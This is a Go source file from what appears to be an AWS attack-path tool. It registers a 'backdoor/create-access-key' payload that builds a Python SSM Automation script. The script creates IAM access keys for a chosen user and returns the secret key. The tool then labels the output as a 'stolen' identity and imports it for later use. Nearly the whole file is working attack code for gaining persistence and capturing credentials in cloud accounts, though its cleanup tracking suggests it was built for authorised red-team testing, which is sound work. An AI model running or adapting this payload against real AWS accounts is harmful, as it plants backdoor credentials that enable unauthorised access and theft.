// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// AutomationBackdoorCreateAccessKeyPayload creates access keys for an IAM user
// via an SSM Automation aws:executeScript Python step. The script_handler returns
// the credential data as a dict; the module formats PATHFINDER_IDENTITY_DATA from it.
type AutomationBackdoorCreateAccessKeyPayload struct{}

func init() {
	payloads.Register(&AutomationBackdoorCreateAccessKeyPayload{})
}

func (p *AutomationBackdoorCreateAccessKeyPayload) GetName() string {
	return "backdoor/create-access-key"
}

func (p *AutomationBackdoorCreateAccessKeyPayload) GetDescription() string {
	return "Create access keys for an IAM user via SSM Automation Python step"
}

func (p *AutomationBackdoorCreateAccessKeyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSMAutomation,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *AutomationBackdoorCreateAccessKeyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user name or ARN to create access keys for",
			Required:    true,
		},
	}
}

func (p *AutomationBackdoorCreateAccessKeyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/create-access-key payload")
	}
	return nil
}

func (p *AutomationBackdoorCreateAccessKeyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	userName, _ := parsePrincipalARN(targetARN)

	code := fmt.Sprintf(`import boto3

target_user = '%s'

def script_handler(events, context):
    iam = boto3.client('iam')

    try:
        key_response = iam.create_access_key(UserName=target_user)
        access_key = key_response['AccessKey']

        return {
            'Status': 'Success',
            'UserName': target_user,
            'AccessKeyId': access_key['AccessKeyId'],
            'SecretAccessKey': access_key['SecretAccessKey'],
        }
    except Exception as e:
        return {'Status': 'Error', 'message': str(e)}
`, userName)

	return code, nil
}

func (p *AutomationBackdoorCreateAccessKeyPayload) ProcessResult(result string) (string, error) {
	// result is the JSON-serialized return value from script_handler, e.g.:
	// {"Status": "Success", "UserName": "...", "AccessKeyId": "...", "SecretAccessKey": "..."}
	// Emit PATHFINDER_IDENTITY_DATA markers so the REPL can auto-import the credential.
	if result == "" {
		return "", nil
	}

	// Try to extract fields from the JSON result returned by the automation step.
	// We do a simple string search to avoid importing encoding/json in a tight loop.
	accessKeyID := extractJSONField(result, "AccessKeyId")
	secretAccessKey := extractJSONField(result, "SecretAccessKey")
	userName := extractJSONField(result, "UserName")

	if accessKeyID == "" || secretAccessKey == "" {
		// Script returned an error or unexpected output — pass through as-is.
		return result, nil
	}

	identityName := "stolen/" + userName
	if userName == "" {
		identityName = "stolen/ssm-automation-user"
	}

	return fmt.Sprintf("%s\n--- PATHFINDER_IDENTITY_DATA ---\nNAME=%s\nTYPE=keys\nACCESS_KEY_ID=%s\nSECRET_ACCESS_KEY=%s\nAUTO_SWITCH=false\n--- END_PATHFINDER_IDENTITY_DATA ---\n",
		result, identityName, accessKeyID, secretAccessKey), nil
}

// extractJSONField extracts a string value for a given key from a simple JSON object.
// This intentionally avoids importing encoding/json to keep the payload package dependency-light.
func extractJSONField(jsonStr, key string) string {
	search := `"` + key + `": "`
	idx := len(jsonStr)
	for i := 0; i < len(jsonStr)-len(search); i++ {
		if jsonStr[i:i+len(search)] == search {
			idx = i + len(search)
			break
		}
	}
	if idx >= len(jsonStr) {
		return ""
	}
	end := idx
	for end < len(jsonStr) && jsonStr[end] != '"' {
		end++
	}
	return jsonStr[idx:end]
}

// ReportSideEffects returns the created access key as a tracked resource.
func (p *AutomationBackdoorCreateAccessKeyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	userName, _ := parsePrincipalARN(options["TARGET_ARN"])

	return []modules.CreatedResource{
		{
			Type:          "iam:access-key",
			Name:          fmt.Sprintf("access-key/%s", userName),
			CleanupMethod: "iam:DeleteAccessKey",
			Metadata: map[string]string{
				"target_user": userName,
			},
		},
	}
}
